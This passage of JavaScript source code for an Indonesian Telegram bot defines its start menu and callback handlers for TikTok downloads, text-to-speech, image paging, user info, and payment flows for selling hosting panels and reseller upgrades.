//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async function uploadUguu(buffer, filename) {
try {
const form = new FormData();
form.append("files[]", buffer, { filename });
const response = await axios.post("https://uguu.se/upload.php", form, {
headers: {
...form.getHeaders(),
'Accept': 'application/json'
}
});
const json = response.data;
return json.files?.[0]?.url || null;
} catch (error) {
console.error('Uguu upload error:', error.message);
return null;
}
}

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📱 START COMMAND WITH VIDEO - MODIFIKASI
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const startParam = match && match[1] ? match[1].trim() : null;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = `/start ${startParam || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
const users = loadUsers();
if (!users[userId]) {
users[userId] = {
username: username,
first_name: msg.from.first_name,
last_name: msg.from.last_name || '',
joinedAt: new Date().toISOString(),
lastSeen: new Date().toISOString()
};
saveUsers(users);
} else {
users[userId].lastSeen = new Date().toISOString();
users[userId].username = username;
saveUsers(users);
}
const isUserReseller = isReseller(userId);
const isUserAdmin = isAdmin(userId);
let status = 'User';
if (isUserAdmin) {
status = 'Admin 🜲';
} else if (isUserReseller) {
status = 'Seller';
}
const configData = getServerConfig();
const uptime = os.uptime();
const vpsUptimeStr = `${Math.floor(uptime / 86400)}d ${Math.floor((uptime % 86400) / 3600)}h ${Math.floor((uptime % 3600) / 60)}m`;
const totalUsers = Object.keys(users).length;
const caption = `<blockquote>( 👤 ) - 情報, ${escapeHTML(username)}</blockquote>
안녕하세요 사용자, 환영합니다!

<blockquote><b>Status :</b> ${escapeHTML(status)}
<b>bot name :</b> ${escapeHTML(config.BOT_NAME)}
<b>versi bot :</b> ${escapeHTML(config.VERSI)}
<b>Total User :</b> ${totalUsers} User
<b>Waktu :</b> ${new Date().toLocaleTimeString('id-ID', {hour12: false})}</blockquote>

Ini adalah durasi aktif panel
<blockquote>📡 ${escapeHTML(vpsUptimeStr)}</blockquote>`;
const buttons = {
caption: caption,
parse_mode: "HTML",
reply_to_message_id: msg.message_id,
reply_markup: {
inline_keyboard: [
[
{ text: "⿻ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ", callback_data: "createpanel" },
{ text: "⿻ ᴜᴘɢʀᴀᴅᴇ sᴇʟʟᴇʀ", callback_data: "buy_seller" }
],
[
{ text: "ᴛᴏᴏʟꜱ ᴍᴇɴᴜ", callback_data: "tools_menu" },
{ text: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "ownermenu" }
],
[
{ text: "ᴠɪᴇᴡ ᴄᴏɴꜰɪɢ", callback_data: "view_config" },
{ text: "ᴄᴇᴋ ɪᴅ", callback_data: "cek_id" }
],
[
{ text: "ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url: "https://t.me/botzmarket59" }
],
[
{ text: "ᴄʜᴀᴛ ᴀᴅᴍɪɴ", url: config.URLADMIN }
]
]
}
};
try {
await bot.sendVideo(chatId, config.URLVIDEO, buttons);
} catch (error) {
console.error('Error sending video:', error);
logError('START_COMMAND_ERROR', `User: ${userId}, Chat: ${chatId}, Error: ${error.message}`);
await bot.sendMessage(chatId, caption, { parse_mode: 'HTML', reply_markup: buttons.reply_markup });
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎮 CALLBACK QUERY HANDLER - TAMBAH CEK ID (DIPERBAIKI)
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('callback_query', async (callbackQuery) => {
const chatId = callbackQuery.message.chat.id;
const data = callbackQuery.data;
const messageId = callbackQuery.message.message_id;
const userId = callbackQuery.from.id.toString();
const username = callbackQuery.from.username ? `@${callbackQuery.from.username}` : callbackQuery.from.first_name;
const chatType = callbackQuery.message.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? callbackQuery.message.chat.title : null;
logUserInteraction(userId, username, chatType, `CALLBACK: ${data}`, groupName);

if (data.startsWith("pin_")) {
try {
const [action, chatId, idxStr] = data.split("|");
const messageId = callbackQuery.message.message_id;
const pinData = global.pinData?.[messageId];
if (!pinData) return bot.answerCallbackQuery(callbackQuery.id, { text: "⚠️ Data sudah kadaluarsa." });
let index = parseInt(idxStr);
if (action === "pin_next") index = (index + 1) % pinData.results.length;
if (action === "pin_prev") index = (index - 1 + pinData.results.length) % pinData.results.length;
const item = pinData.results[index];
const inlineKeyboard = {
inline_keyboard: [
[
{ text: "⬅️", callback_data: `pin_prev|${chatId}|${index}` },
{ text: `${index + 1}/${pinData.results.length}`, callback_data: "noop" },
{ text: "➡️", callback_data: `pin_next|${chatId}|${index}` }
]
]
};
await bot.editMessageMedia(
{
type: "photo",
media: item.imageUrl,
parse_mode: "Markdown"
},
{
chat_id: chatId,
message_id: messageId,
reply_markup: inlineKeyboard
}
);
pinData.index = index;
bot.answerCallbackQuery(callbackQuery.id);
} catch (err) {
console.error("❌ Callback Error:", err.message);
bot.answerCallbackQuery(callbackQuery.id, { text: "⚠️ Gagal memuat gambar." });
}
} else if (data.startsWith('tts_')) {
const parts = data.split('_');
const voiceCode = parts[1];
const encodedText = parts.slice(2).join('_');
const text = decodeURIComponent(encodedText);
await bot.answerCallbackQuery(callbackQuery.id, { 
text: `Membuat audio ${voiceCode === 'id' ? 'Indonesia' : voiceCode === 'usf' ? 'US Female' : voiceCode === 'usm' ? 'US Male' : voiceCode === 'jp' ? 'Japanese' : voiceCode === 'kr' ? 'Korean' : 'Unknown'}...`, 
show_alert: false 
});

if (!text) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Teks tidak ditemukan!', show_alert: true });
return;
}

try {
let voiceType = 'id_001';
switch (voiceCode) {
case 'id': voiceType = 'id_001'; break;
case 'usf': voiceType = 'en_us_001'; break;
case 'usm': voiceType = 'en_us_006'; break;
case 'jp': voiceType = 'jp_001'; break;
case 'kr': voiceType = 'kr_001'; break;
}

const encodedApiText = encodeURIComponent(text);
const apiUrl = `https://exsalapi.my.id/api/audio/tiktok-tts?text=${encodedApiText}&voice=${voiceType}&apikey=${AI_API_KEY}`;
const response = await fetch(apiUrl);
if (!response.ok) throw new Error(`HTTP ${response.status}`);
const apiData = await response.json();
if (!apiData.status || !apiData.data || !apiData.data.url) throw new Error('API gagal membuat audio');

// Unduh audio ke buffer
const audioResponse = await fetch(apiData.data.url);
if (!audioResponse.ok) throw new Error(`Gagal mengunduh audio: ${audioResponse.status}`);
const audioBuffer = await audioResponse.arrayBuffer();

const voiceNames = {
'id': '🇮🇩 Indonesia',
'usf': '🇺🇸 US Female', 
'usm': '🇺🇸 US Male',
'jp': '🇯🇵 Japanese',
'kr': '🇰🇷 Korean'
};

const voiceName = voiceNames[voiceCode] || 'Unknown';

// Buat keyboard dengan suara aktif yang dipilih
const keyboard = {
inline_keyboard: [
[
{ text: voiceCode === 'id' ? '✅ Indonesia' : '🇮🇩 Indonesia', callback_data: `tts_id_${encodeURIComponent(text.substring(0, 100))}` },
{ text: voiceCode === 'usf' ? '✅ US Female' : '🇺🇸 US Female', callback_data: `tts_usf_${encodeURIComponent(text.substring(0, 100))}` }
],
[
{ text: voiceCode === 'usm' ? '✅ US Male' : '🇺🇸 US Male', callback_data: `tts_usm_${encodeURIComponent(text.substring(0, 100))}` },
{ text: voiceCode === 'jp' ? '✅ Japanese' : '🇯🇵 Japanese', callback_data: `tts_jp_${encodeURIComponent(text.substring(0, 100))}` }
],
[
{ text: voiceCode === 'kr' ? '✅ Korean' : '🇰🇷 Korean', callback_data: `tts_kr_${encodeURIComponent(text.substring(0, 100))}` }
]
]
};

// Hapus pesan lama dan kirim audio baru
try {
await bot.deleteMessage(chatId, messageId);
} catch (e) {
console.log('Tidak bisa hapus pesan TTS lama:', e.message);
}

const sentMessage = await bot.sendAudio(chatId, Buffer.from(audioBuffer), {
caption: `<blockquote>🔊 TTS Audio - ${voiceName}</blockquote>\n\n` +
`<b>Teks:</b> ${escapeHTML(text.substring(0, 100))}${text.length > 100 ? '...' : ''}\n` +
`<b>Suara:</b> ${voiceName}\n` +
`<b>Panjang:</b> ${text.length} karakter\n\n` +
`<i>Pilih suara lain:</i>`,
parse_mode: 'HTML',
reply_markup: keyboard
});

// Update cache
if (!global.ttsCache) global.ttsCache = {};
const cacheKey = `tts_${sentMessage.message_id}`;
global.ttsCache[cacheKey] = {
text: text,
messageId: sentMessage.message_id,
chatId: chatId
};

} catch (error) {
console.error('TTS callback error:', error);
await bot.answerCallbackQuery(callbackQuery.id, { text: `❌ Gagal membuat audio: ${error.message.substring(0, 50)}`, show_alert: true });
}
} else if (data.startsWith('tt_profile_')) {
const cacheKey = data.replace('tt_profile_', '');
await bot.answerCallbackQuery(callbackQuery.id, { text: '📡 Mengambil data profil...' });
try {
const cached = global.tiktokCache?.[cacheKey];
if (!cached?.authorUniqueId) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Data profil tidak ditemukan!', show_alert: true });
return;
}
const response = await axios.get(`https://api.resellergaming.my.id/stalk/tiktok?username=${encodeURIComponent(cached.authorUniqueId)}`, { timeout: 15000 });
const stalkData = response.data;
if (stalkData.status && stalkData.result) {
const user = stalkData.result;
const formatNumber = (num) => {
if (!num) return "0";
if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
if (num >= 1000) return (num / 1000).toFixed(1) + "K";
return num.toString();
};
let profileMsg = `<blockquote>👤 PROFIL TIKTOK</blockquote>\n\n`;
profileMsg += `<b>🎭 Nickname:</b> ${escapeHTML(user.nickname)}\n`;
profileMsg += `<b>📛 Username:</b> @${escapeHTML(user.uniqueId)}\n`;
profileMsg += `<b>📝 Signature:</b> ${escapeHTML(user.signature || 'Tidak ada')}\n\n`;
profileMsg += `<b>📊 Statistik:</b>\n`;
profileMsg += `👥 <b>Followers:</b> ${formatNumber(user.followers)}\n`;
profileMsg += `👤 <b>Following:</b> ${formatNumber(user.following)}\n`;
profileMsg += `❤️ <b>Total Like:</b> ${formatNumber(user.likes)}\n`;
profileMsg += `📹 <b>Total Video:</b> ${formatNumber(user.videos)}\n\n`;
profileMsg += `<i>Data diambil dari API stalk TikTok</i>`;
const keyboard = {
inline_keyboard: [
[
{ text: "📹 KEMBALI KE VIDEO", callback_data: `tt_back_video_${cacheKey}` },
{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` }
],
[
{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
]
]
};
try {
await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
} catch (e) {}
if (user.avatar) {
await bot.sendPhoto(callbackQuery.message.chat.id, user.avatar, { caption: profileMsg, parse_mode: "HTML", reply_markup: keyboard });
} else {
await bot.sendMessage(callbackQuery.message.chat.id, profileMsg, { parse_mode: "HTML", reply_markup: keyboard });
}
} else {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal ambil profil!', show_alert: true });
}
} catch (error) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error ambil profil!', show_alert: true });
}
} else if (data.startsWith('tt_back_video_')) {
const cacheKey = data.replace('tt_back_video_', '');
await bot.answerCallbackQuery(callbackQuery.id, { text: '↩️ Kembali ke video...' });
try {
const cached = global.tiktokCache?.[cacheKey];
if (!cached) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Data tidak ditemukan!', show_alert: true });
return;
}
const videoUrl = cached.currentQuality === 'hd' ? 
(cached.downloadResult?.video_hd || cached.videoInfo.play) : 
(cached.downloadResult?.video_sd || cached.videoInfo.wmplay || cached.videoInfo.play);
const formatNumber = (num) => {
if (!num) return "0";
if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
if (num >= 1000) return (num / 1000).toFixed(1) + "K";
return num.toString();
};
const caption = `<blockquote>📱 TIKTOK DOWNLOADER</blockquote>\n
<b>🎬 Judul:</b> ${escapeHTML(cached.videoInfo.title || 'Tidak ada judul')}\n
<b>👤 Creator:</b> ${cached.authorUniqueId ? `@${escapeHTML(cached.authorUniqueId)}` : 'Tidak diketahui'}\n
<b>📊 Statistik:</b>\n👁️ ${formatNumber(cached.videoInfo.play_count || 0)} views\n❤️ ${formatNumber(cached.videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(cached.videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(cached.videoInfo.share_count || 0)} shares\n
<b>⏱️ Durasi:</b> ${cached.videoInfo.duration || 0} detik\n
<i>Pilih opsi di bawah:</i>`;
const qualityButtons = [];
if (cached.currentQuality === 'hd') {
qualityButtons.push({ text: "📹 DOWNLOAD SD", callback_data: `tt_sd_${cacheKey}` });
} else {
qualityButtons.push({ text: "📹 KUALITAS HD", callback_data: `tt_hd_${cacheKey}` });
}
const keyboard = {
inline_keyboard: [
[
{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` },
...qualityButtons
],
[
{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
]
]
};
try {
await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
} catch (e) {}
await bot.sendVideo(callbackQuery.message.chat.id, videoUrl, { caption: caption, parse_mode: "HTML", reply_markup: keyboard });
} catch (error) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal kembali ke video!', show_alert: true });
}
} else if (data.startsWith('tt_audio_')) {
const cacheKey = data.replace('tt_audio_', '');
await bot.answerCallbackQuery(callbackQuery.id, { text: '⬇️ Mengirim audio...' });
try {
const cached = global.tiktokCache?.[cacheKey];
if (!cached?.downloadResult?.mp3) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Audio tidak tersedia!', show_alert: true });
return;
}
const formatNumber = (num) => {
if (!num) return "0";
if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
if (num >= 1000) return (num / 1000).toFixed(1) + "K";
return num.toString();
};
const caption = `<blockquote>🎵 AUDIO TIKTOK</blockquote>\n
<b>🎬 Judul:</b> ${escapeHTML(cached.videoInfo.title || 'Tidak ada judul')}\n
<b>👤 Creator:</b> ${cached.authorUniqueId ? `@${escapeHTML(cached.authorUniqueId)}` : 'Tidak diketahui'}\n
<b>📊 Statistik:</b>\n👁️ ${formatNumber(cached.videoInfo.play_count || 0)} views\n❤️ ${formatNumber(cached.videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(cached.videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(cached.videoInfo.share_count || 0)} shares\n
<b>⏱️ Durasi:</b> ${cached.videoInfo.duration || 0} detik\n
<i>Audio berhasil diunduh!</i>`;
const keyboard = {
inline_keyboard: [
[
{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
{ text: "📹 KEMBALI KE VIDEO", callback_data: `tt_back_video_${cacheKey}` }
],
[
{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
]
]
};
try {
await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
} catch (e) {}
await bot.sendAudio(callbackQuery.message.chat.id, cached.downloadResult.mp3, { caption: caption, parse_mode: "HTML", reply_markup: keyboard });
} catch (error) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal kirim audio!', show_alert: true });
}
} else if (data.startsWith('tt_sd_')) {
const cacheKey = data.replace('tt_sd_', '');
await bot.answerCallbackQuery(callbackQuery.id, { text: '⬇️ Mengirim video SD...' });
try {
const cached = global.tiktokCache?.[cacheKey];
const videoUrl = cached?.downloadResult?.video_sd || cached?.videoInfo?.wmplay || cached?.videoInfo?.play;
if (!videoUrl) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Video SD tidak tersedia!', show_alert: true });
return;
}
cached.currentQuality = 'sd';
cached.currentMedia = 'video';
const formatNumber = (num) => {
if (!num) return "0";
if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
if (num >= 1000) return (num / 1000).toFixed(1) + "K";
return num.toString();
};
const caption = `<blockquote>📹 VIDEO TIKTOK SD</blockquote>\n
<b>🎬 Judul:</b> ${escapeHTML(cached.videoInfo.title || 'Tidak ada judul')}\n
<b>👤 Creator:</b> ${cached.authorUniqueId ? `@${escapeHTML(cached.authorUniqueId)}` : 'Tidak diketahui'}\n
<b>📊 Statistik:</b>\n👁️ ${formatNumber(cached.videoInfo.play_count || 0)} views\n❤️ ${formatNumber(cached.videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(cached.videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(cached.videoInfo.share_count || 0)} shares\n
<b>⏱️ Durasi:</b> ${cached.videoInfo.duration || 0} detik\n
<i>Video kualitas SD berhasil diunduh!</i>`;
const keyboard = {
inline_keyboard: [
[
{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` },
{ text: "📹 KUALITAS HD", callback_data: `tt_hd_${cacheKey}` }
],
[
{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
]
]
};
try {
await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
} catch (e) {}
await bot.sendVideo(callbackQuery.message.chat.id, videoUrl, { caption: caption, parse_mode: "HTML", reply_markup: keyboard });
} catch (error) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal kirim video SD!', show_alert: true });
}
} else if (data.startsWith('tt_hd_')) {
const cacheKey = data.replace('tt_hd_', '');
await bot.answerCallbackQuery(callbackQuery.id, { text: '⬇️ Mengirim video HD...' });
try {
const cached = global.tiktokCache?.[cacheKey];
const videoUrl = cached?.downloadResult?.video_hd || cached?.videoInfo?.play;
if (!videoUrl) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Video HD tidak tersedia!', show_alert: true });
return;
}
cached.currentQuality = 'hd';
cached.currentMedia = 'video';
const formatNumber = (num) => {
if (!num) return "0";
if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
if (num >= 1000) return (num / 1000).toFixed(1) + "K";
return num.toString();
};
const caption = `<blockquote>📹 VIDEO TIKTOK HD</blockquote>\n
<b>🎬 Judul:</b> ${escapeHTML(cached.videoInfo.title || 'Tidak ada judul')}\n
<b>👤 Creator:</b> ${cached.authorUniqueId ? `@${escapeHTML(cached.authorUniqueId)}` : 'Tidak diketahui'}\n
<b>📊 Statistik:</b>\n👁️ ${formatNumber(cached.videoInfo.play_count || 0)} views\n❤️ ${formatNumber(cached.videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(cached.videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(cached.videoInfo.share_count || 0)} shares\n
<b>⏱️ Durasi:</b> ${cached.videoInfo.duration || 0} detik\n
<i>Video kualitas HD berhasil diunduh!</i>`;
const keyboard = {
inline_keyboard: [
[
{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` },
{ text: "📹 DOWNLOAD SD", callback_data: `tt_sd_${cacheKey}` }
],
[
{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
]
]
};
try {
await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
} catch (e) {}
await bot.sendVideo(callbackQuery.message.chat.id, videoUrl, { caption: caption, parse_mode: "HTML", reply_markup: keyboard });
} catch (error) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal kirim video HD!', show_alert: true });
}
} else if (data.startsWith('tt_cancel_')) {
const cacheKey = data.replace('tt_cancel_', '');
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Dibatalkan' });
try {
const cached = global.tiktokCache?.[cacheKey];
if (cached) {
try {
await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
} catch (e) {}
delete global.tiktokCache[cacheKey];
}
} catch (error) {
console.log("Tidak bisa hapus pesan TikTok:", error.message);
}
} else if (data.startsWith('Status_')) {
const orderId = data.replace('Status_', '');
const statusData = await checkPaymentStatus(orderId);
let statusText = 'MENUNGGU';
if (statusData && statusData.transaction) {
const status = (statusData.transaction.status || '').toString().toUpperCase();
if (status.includes('SUCCESS') || status.includes('COMPLETED') || status.includes('PAID')) {
statusText = '✅ BERHASIL';
} else if (status.includes('FAILED') || status.includes('EXPIRED') || status.includes('CANCELLED')) {
statusText = '❌ GAGAL';
}
}
await bot.answerCallbackQuery(callbackQuery.id, {
text: `Status: ${statusText}`,
show_alert: true
});
} else if (data.startsWith('copy_')) {
const orderId = data.replace('copy_', '');
const transactions = loadTransactions();
const transaction = transactions[orderId];
if (transaction) {
const copyText = `Username: ${transaction.username}\nPassword: ${transaction.password}\nEmail: ${transaction.email}\nPanel: ${transaction.panelType}\nOrder ID: ${orderId}`;
await bot.answerCallbackQuery(callbackQuery.id, {
text: 'Data disalin ke clipboard!',
show_alert: true
});
}
} else if (data.startsWith('cancel_')) {
const orderId = data.replace('cancel_', '');
if (global.pollingIntervals && global.pollingIntervals[orderId]) {
const pollingData = global.pollingIntervals[orderId];
if (pollingData.interval) {
clearInterval(pollingData.interval);
pollingData.isCancelled = true;
}
delete global.pollingIntervals[orderId];
}
const transactions = loadTransactions();
if (transactions[orderId]) {
transactions[orderId].status = 'cancelled';
transactions[orderId].cancelledAt = new Date().toISOString();
saveTransactions(transactions);
}
try {
await bot.editMessageCaption(
`<blockquote>┌─⧼ <b>❌ Pembayaran Dibatalkan</b> ⧽
├ Pembayaran telah dibatalkan oleh pengguna.
├ Order ID: <code>${orderId}</code>
╰ Silakan mulai ulang jika ingin melanjutkan.</blockquote>`,
{
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[
{ text: '🔄 Buat Pesanan Baru', callback_data: 'createpanel' }
]
]
}
}
);
} catch (error) {
console.error('Error updating cancelled message:', error);
logError('CANCEL_CALLBACK_ERROR', `Order: ${orderId}, Error: ${error.message}`, userId, username);
}
setTimeout(() => {
bot.deleteMessage(chatId, messageId).catch(() => {});
}, 5000);
await bot.answerCallbackQuery(callbackQuery.id, { 
text: '✅ Pembayaran berhasil dibatalkan! Foto QR akan dihapus otomatis.', 
show_alert: false 
});
} else if (data.startsWith('status_')) {
const orderId = data.replace('status_', '');
const transactions = loadTransactions();
const transaction = transactions[orderId];
if (transaction) {
const statusMap = {
'pending': '⏳ Menunggu Pembayaran',
'completed': '✅ Berhasil',
'failed': '❌ Gagal',
'timeout': '⏰ Timeout',
'cancelled': '⛔ Dibatalkan'
};
const status = statusMap[transaction.status] || '❓ Tidak Diketahui';
await bot.answerCallbackQuery(callbackQuery.id, {
text: `Status: ${status}`,
show_alert: true
});
} else {
await bot.answerCallbackQuery(callbackQuery.id, {
text: 'Transaksi tidak ditemukan!',
show_alert: true
});
}
} else if (data.startsWith('cancel_seller_')) {
const orderId = data.replace('cancel_seller_', '');
if (global.pollingIntervals && global.pollingIntervals[orderId]) {
const pollingData = global.pollingIntervals[orderId];
if (pollingData.interval) {
clearInterval(pollingData.interval);
pollingData.isCancelled = true;
}
delete global.pollingIntervals[orderId];
}
const transactions = loadTransactions();
if (transactions[orderId]) {
transactions[orderId].status = 'cancelled';
saveTransactions(transactions);
}
try {
await bot.editMessageCaption(
`<blockquote>┌─⧼ <b>❌ Seller Upgrade Dibatalkan</b> ⧽
┃ Upgrade seller telah dibatalkan.
┃ Order ID: <code>${orderId}</code>
╰ Ketik /addseller untuk mencoba lagi</blockquote>`,
{
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML'
}
);
} catch (error) {
console.error('Error updating cancelled seller message:', error);
logError('SELLER_CANCEL_ERROR', `Order: ${orderId}, Error: ${error.message}`, userId, username);
}
setTimeout(() => {
bot.deleteMessage(chatId, messageId).catch(() => {});
}, 5000);
await bot.answerCallbackQuery(callbackQuery.id, { 
text: '✅ Seller upgrade dibatalkan! Foto QR akan dihapus otomatis.', 
show_alert: false 
});
} else if (data === 'cek_id') {
try {
const users = loadUsers();
const userData = users[userId] || {};
const joinDate = userData.joinedAt ? new Date(userData.joinedAt).toLocaleDateString('id-ID') : 'Tidak diketahui';
const lastSeen = userData.lastSeen ? new Date(userData.lastSeen).toLocaleString('id-ID') : 'Tidak diketahui';
const isUserReseller = isReseller(userId);
const isUserAdmin = isAdmin(userId);
let status = 'User';
if (isUserAdmin) {
status = 'Admin 🜲';
} else if (isUserReseller) {
status = 'Seller';
}
const now = new Date();
const formattedDate = now.toLocaleDateString('id-ID', { 
weekday: 'long', 
year: 'numeric', 
month: 'long', 
day: 'numeric' 
});
const formattedTime = now.toLocaleTimeString('id-ID', { 
hour: '2-digit', 
minute: '2-digit' 
});
const cekIdText = `<blockquote>┌─⧼ <b>🆔 ɪɴꜰᴏʀᴍᴀꜱɪ ᴜꜱᴇʀ</b> ⧽
┃ ⬡ User ID: <code>${userId}</code>
┃ ⬡ Username: ${escapeHTML(username)}
┃ ⬡ Nama: ${escapeHTML(callbackQuery.from.first_name || 'Tidak ada')}
┃ ⬡ Status: ${escapeHTML(status)}
┃ ⬡ Bergabung: ${escapeHTML(joinDate)}
┃ ⬡ Terakhir dilihat: ${escapeHTML(lastSeen)}
┃ ⬡ Tanggal: ${escapeHTML(formattedDate)}
┃ ⬡ Jam: ${escapeHTML(formattedTime)}
╰──────────────────⬣</blockquote>`;
await bot.editMessageCaption(cekIdText, {
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[{ text: '<< Kembali', callback_data: 'back' }]
]
}
});
await bot.answerCallbackQuery(callbackQuery.id, { 
text: '✅ Informasi user ditampilkan', 
show_alert: false 
});
} catch (error) {
console.error('Error in cek_id callback:', error);
await bot.answerCallbackQuery(callbackQuery.id, { 
text: '❌ Gagal menampilkan informasi', 
show_alert: true 
});
}
} else if (data === 'createpanel' || data === 'create_panel') {
const panelList = `<blockquote>┌─⧼ <b>ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ</b> ⧽
┃ ⬡<b>versi bot :</b> ${escapeHTML(config.VERSI)}
┃ ⬡<b>owner :</b> ${escapeHTML(config.DEVCELOPER)}
┃ ⬡<b>bot name :</b> ${escapeHTML(config.BOT_NAME)}
╰────────────⬣
┌─⧼ <b>ᴘᴀᴋᴇᴛ ᴘᴀɴᴇʟ</b> ⧽ 
┃ ❏ ─· /1gb   [username,id] - Rp 1.000
┃ ❏ ─· /2gb   [username,id] - Rp 2.000
┃ ❏ ─· /3gb   [username,id] - Rp 3.000
┃ ❏ ─· /4gb   [username,id] - Rp 4.000
┃ ❏ ─· /5gb   [username,id] - Rp 5.000
┃ ❏ ─· /6gb   [username,id] - Rp 7.000
┃ ❏ ─· /7gb   [username,id] - Rp 8.000
┃ ❏ ─· /8gb   [username,id] - Rp 9.000
┃ ❏ ─· /9gb   [username,id] - Rp 10.000
┃ ❏ ─· /10gb [username,id] - Rp 11.000
┃ ❏ ─· /unli    [username,id] - Rp 12.000
╰─────────────⬣</blockquote>`;
await bot.editMessageCaption(panelList, {
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[{ text: '<<', callback_data: 'back' }]
]
}
});
} else if (data === 'buy_seller') {
const sellerInfo = `<blockquote>
┌─⧼ <b>reseller panel Keuntungan:</b> ⧽
┃ ✅ Buat panel gratis tanpa batas
┃ ✅ Akses semua paket panel
┃ ✅ Prioritas support premium
┃ ✅ Bisa buat panel untuk orang lain
┃ ✅ Akses fitur seller dashboard
╰────────────⬣

┌─⧼ <b>Instruksi:</b> ⧽
┃ 1: Ketik /addseller [ID_ANDA]
┃ 2: Scan QR yang muncul
┃ 3: bayar sesuai harga yang tertera
┃ 4: Otomatis aktif seller panel
╰─────────────⬣

┌─⧼ <b>Catatan:</b> ⧽
┃ ⚠️ Masukkan ID Telegram Anda
┃ Contoh: /addseller 123456789
┃ Dapatkan ID ketik /cekid
╰─────────────⬣</blockquote>`;
await bot.editMessageCaption(sellerInfo, {
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[{ text: '<<', callback_data: 'back' }]
]
}
});
} else if (data === 'tools_menu') {
const toolsList = `<blockquote>
╭─━ ⧼ <b>ᴛᴏᴏʟꜱ ᴍᴇɴᴜ</b> ⧽
┃ ❏ ─· /info
┃ ❏ ─· /cekid
┃ ❏ ─· /pin
┃ ❏ ─· /play 
┃ ❏ ─· /tourl
┃ ❏ ─· /deploy
┃ ❏ ─· /listseller
┃ ❏ ─· /brat
┃ ❏ ─· /iqc
┃ ❏ ─· /hd
┃ ❏ ─· /ssweb
┃ ❏ ─· /tt
┃ ❏ ─· /toblur
┃ ❏ ─· /tohijab
┃ ❏ ─· /tozombie
┃ ❏ ─· /totua
┃ ❏ ─· /topacar
┃ ❏ ─· /tochibi
┃ ❏ ─· /tofigure
┃ ❏ ─· /toghibli
┃ ❏ ─· /tojepang
┃ ❏ ─· /tovintage
┃ ❏ ─· /toanime
┃ ❏ ─· /totato
┃ ❏ ─· /toreal
┃ ❏ ─· /tomirror
┃ ❏ ─· /shortlink
┃ ❏ ─· /tts
╰──────────━𖣐
╭─━ ⧼ <b>ᴘᴀᴋᴇᴛ ᴘᴀɴᴇʟ</b> ⧽
┃ ❏ ─· /1gb name,id
